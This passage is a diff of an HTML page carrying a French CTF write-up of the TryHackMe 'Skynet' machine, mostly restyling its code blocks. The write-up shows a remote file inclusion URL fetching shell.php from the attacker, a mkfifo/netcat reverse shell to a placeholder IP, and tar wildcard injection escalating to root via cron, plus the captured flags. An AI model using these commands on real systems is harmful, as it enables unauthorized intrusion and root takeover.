+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<notre_ip>:8000/shell.php</notre_ip></span>
+</code></code></pre></div></div>
 <p>On obtiens ainsi un shell.</p>
 <p><strong>Pourquoi ça marche ?</strong></p>
 <blockquote>
@@ -476,80 +471,80 @@ function printit ($string) {
 </blockquote>
 <h2 id="capture-de-luser-flag">Capture de l’User Flag</h2>
 <p>Maintenant qu’on a un accès à la machine on peut maintenant récupérer le flag user</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/$ ls /home</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ls /home</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">milesdyson</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/$ cd /home/milesdyson</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">cd /home/milesdyson</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ ls</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ls</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">backups</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mail</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">share</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">user.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ cat user.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">cat user.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">7ce5c2109a40f958099283600a9ae807</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ </span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/$ ls /home</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ls /home</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">milesdyson</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/$ cd /home/milesdyson</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">cd /home/milesdyson</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ ls</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ls</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">backups</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">mail</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">share</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">user.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ cat user.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">cat user.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">7ce5c2109a40f958099283600a9ae807</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ </span>
+</code></code></pre></div></div>
 <p>⛳<strong>Flag User</strong> : 7ce5c2109a40f958099283600a9ae807</p>
 <h2 id="escalade-de-privilege">Escalade de privilège</h2>
 <p>Une fois le flag user obtenu il est tant d’augmenter nos droits. La méthode la plus courante est de vérifiser si nous pouvons exécuter des commandes sudo sans mots de passe. Vérifions</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ sudo -l</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sudo -l</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sudo: no tty present and no askpass program specified</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ sudo -l</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sudo -l</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sudo: no tty present and no askpass program specified</span>
+</code></code></pre></div></div>
 <p>Vu que ça ne marche pas continuons notre exploration. </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ ls </span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ls </span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">backups</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mail</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">share</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">user.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ cd backups</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">cd backups</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson/backups$ ls</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ls</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">backup.sh</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">backup.tgz</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson/backups$ cat backup.sh</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">cat backup.sh</span>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ ls </span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ls </span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">backups</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">mail</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">share</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">user.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson$ cd backups</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">cd backups</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson/backups$ ls</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ls</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">backup.sh</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">backup.tgz</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson/backups$ cat backup.sh</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">cat backup.sh</span>
 <span class="hl-comment">#!/bin/bash</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">cd /var/www/html</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">tar cf /home/milesdyson/backups/backup.tgz *</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson/backups$ </span>
-</code></pre></div>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">cd /var/www/html</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">tar cf /home/milesdyson/backups/backup.tgz *</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson/backups$ </span>
+</code></code></pre></div></div>
 <p>On découvre que dans le dossier <code>backups</code> on tombe sur un script <code>backup.sh</code> qui se rend dans le dossier /<code>var/www/html</code> et sauvegarde tous les fichiers dans l’archive <code>/home/milesdyson/backups/backup.tgz</code>. </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">cat /etc/crontab</span>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">cat /etc/crontab</span>
 <span class="hl-comment"># /etc/crontab: system-wide crontab</span>
 <span class="hl-comment"># Unlike any other crontab you don't have to run the `crontab'</span>
 <span class="hl-comment"># command to install the new version when you edit this file</span>
 <span class="hl-comment"># and files in /etc/cron.d. These files also have username fields,</span>
 <span class="hl-comment"># that none of the other crontabs do.</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">SHELL=/bin/sh</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">SHELL=/bin/sh</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span>
 <span class="hl-comment"># m h dom mon dow user  command</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">*/1 *   * * *   root    /home/milesdyson/backups/backup.sh</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">*/1 *   * * *   root    /home/milesdyson/backups/backup.sh</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span>
 <span class="hl-comment">#</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson/backups$ </span>
-</code></pre></div>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">www-data@skynet:/home/milesdyson/backups$ </span>
+</code></code></pre></div></div>
 <p>On a aussi découvert que ce script de sauvegarde est exécuter chaque minutes par root. On a donc notre vecteur d’escalade de privilèges appelé Tar Wilcard Injection.</p>
 <p>En effet, quand on utilise * le shell se charge de remplacer ça par la liste des fichiers. Par exemple si dans notre dossier on a </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>abc
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>abc
 acd
 shell
-</code></pre></div>
+</code></code></pre></div></div>
 <p>Et on tape </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">tar *</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">tar *</span>
+</code></code></pre></div></div>
 <p>On a le résultat</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">tar abc acd shell</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">tar abc acd shell</span>
+</code></code></pre></div></div>
 <p>On peut exploiter ce mécanisme car tar dispose de plusieurs options:</p>
 <ul>
 <li>—checkpoint=N qui permet d’effectuer une action tous les N nrégistrements traités</li>
@@ -557,14 +552,14 @@ shell
 </ul>
 <p>On peut exploiter ces faille en créé dans fichiers —checkpoint=N et —checkpoint-action=exec= cmd et quand tar va l’éxécuter ils seront traité comme des options et non des fichiers. On se rend donc dans le dossier /var/www/html </p>
 <p>On lance sur notre machine un écouteur sur le port 9001</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">nc -lvnp 9002</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">nc -lvnp 9002</span>
+</code></code></pre></div></div>
 <p>Ensuite on fais</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">echo "" &gt; --checkpoint=1</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc <notre_ip> 9002 &gt;/tmp/f' &gt; shell.sh</notre_ip></span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">chmod +x shell.sh</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">echo "" &gt; '--checkpoint-action=exec=sh shell.sh'</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">echo "" &gt; --checkpoint=1</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc <notre_ip> 9002 &gt;/tmp/f' &gt; shell.sh</notre_ip></span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">chmod +x shell.sh</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">echo "" &gt; '--checkpoint-action=exec=sh shell.sh'</span>
+</code></code></pre></div></div>
 <p>On obtients ainsi un shell root.</p>
 <p>Pourquoi ça marche ? </p>
 <blockquote>
@@ -573,14 +568,14 @@ shell
 </blockquote>
 <h2 id="capture-de-root-flag">Capture de root flag</h2>
 <p>Après l’obtention du shell on peut capturer le flag root</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@skynet:/var/www/html# ls /root</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ls /root</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@skynet:/var/www/html# cat /root/root.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">cat /root/root.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">3f0372db24753accc7179a282cd6a949</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@skynet:/var/www/html# </span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">root@skynet:/var/www/html# ls /root</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ls /root</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">root.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">root@skynet:/var/www/html# cat /root/root.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">cat /root/root.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">3f0372db24753accc7179a282cd6a949</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">root@skynet:/var/www/html# </span>
+</code></code></pre></div></div>
 <p>⛳<strong>Root Flag</strong>: 3f0372db24753accc7179a282cd6a949</p>
 <h2 id="recommendations">Recommendations</h2>
 <ul>
@@ -591,55 +586,46 @@ shell
 <li>Appliquer le principe du moindre privilège</li>
 <li>Utiliser des chemins absolues</li>
 </ul>
-
-      <div style="margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
-        <a href="../writeups" class="btn btn-outline">← Tous les writeups</a>
-      </div>
-    </article>
-
-    <aside class="writeup-sidebar" style="position: sticky; top: 100px;">
-      <div class="sidebar-title">Table des matières</div>
-      <div class="toc-list" style="max-height: calc(100vh - 150px); overflow-y: auto;">
-        <a href="#configuration" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Configuration</a>
-<a href="#ennumeration" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Ennumération</a>
-<a href="#smb" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; margin-left: 1rem;">SMB</a>
-<a href="#repertoires-caches" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; margin-left: 1rem;">Répertoires cachés</a>
-<a href="#obtention-du-shell" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Obtention du shell</a>
-<a href="#capture-de-luser-flag" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Capture de l’User Flag</a>
-<a href="#escalade-de-privilege" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Escalade de privilège</a>
-<a href="#capture-de-root-flag" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Capture de root flag</a>
-<a href="#recommendations" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Recommendations</a>
-
-      </div>
-      <hr style="border-color:var(--border);margin:1.5rem 0;"/>
-      <div style="display:flex;flex-direction:column;gap:0.6rem;font-size:0.85rem;font-family:var(--font-mono);">
-        <div><span style="color:var(--text-muted);">Plateforme :</span> <span style="color:var(--green);">TryHackMe</span></div>
-        <div><span style="color:var(--text-muted);">Difficulté :</span> <span><span class="diff diff-medium">Medium</span></span></div>
-        <div><span style="color:var(--text-muted);">Date :</span> <span style="color:var(--text-secondary);">2026-03-05</span></div>
-      </div>
-    </aside>
-  </div>
+<div style="margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
+<a class="btn btn-outline" href="../writeups">← Tous les writeups</a>
+</div>
+</article>
+<aside class="writeup-sidebar" style="position: sticky; top: 100px;">
+<div class="sidebar-title">Table des matières</div>
+<div class="toc-list" style="max-height: calc(100vh - 150px); overflow-y: auto;">
+<a class="toc-item" href="#configuration" style="display:block; text-decoration:none; padding:4px 0; ">Configuration</a>
+<a class="toc-item" href="#ennumeration" style="display:block; text-decoration:none; padding:4px 0; ">Ennumération</a>
+<a class="toc-item" href="#smb" style="display:block; text-decoration:none; padding:4px 0; margin-left: 1rem;">SMB</a>
+<a class="toc-item" href="#repertoires-caches" style="display:block; text-decoration:none; padding:4px 0; margin-left: 1rem;">Répertoires cachés</a>
+<a class="toc-item" href="#obtention-du-shell" style="display:block; text-decoration:none; padding:4px 0; ">Obtention du shell</a>
+<a class="toc-item" href="#capture-de-luser-flag" style="display:block; text-decoration:none; padding:4px 0; ">Capture de l’User Flag</a>
+<a class="toc-item" href="#escalade-de-privilege" style="display:block; text-decoration:none; padding:4px 0; ">Escalade de privilège</a>
+<a class="toc-item" href="#capture-de-root-flag" style="display:block; text-decoration:none; padding:4px 0; ">Capture de root flag</a>
+<a class="toc-item" href="#recommendations" style="display:block; text-decoration:none; padding:4px 0; ">Recommendations</a>
+</div>
+<hr style="border-color:var(--border);margin:1.5rem 0;"/>
+<div style="display:flex;flex-direction:column;gap:0.6rem;font-size:0.85rem;font-family:var(--font-mono);">
+<div><span style="color:var(--text-muted);">Plateforme :</span> <span style="color:var(--green);">TryHackMe</span></div>
+<div><span style="color:var(--text-muted);">Difficulté :</span> <span><span class="diff diff-medium">Medium</span></span></div>
+<div><span style="color:var(--text-muted);">Date :</span> <span style="color:var(--text-secondary);">2026-03-05</span></div>
+</div>
